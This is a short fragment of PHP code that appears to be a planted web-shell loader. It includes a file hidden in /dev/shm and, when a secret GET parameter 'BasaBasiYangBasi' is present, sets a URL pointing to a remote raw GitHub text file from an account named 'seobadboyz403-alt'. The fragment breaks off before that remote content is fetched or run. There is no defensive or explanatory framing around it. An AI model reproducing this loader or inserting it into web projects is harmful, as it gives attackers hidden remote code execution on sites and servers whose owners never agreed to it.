...
include("/dev/shm/kepalabatu");
if (isset($_GET['BasaBasiYangBasi'])) {
    $url = "https://raw.githubusercontent.com/seobadboyz403-alt/new-era/refs/heads/main/badboyz-edition.txt";
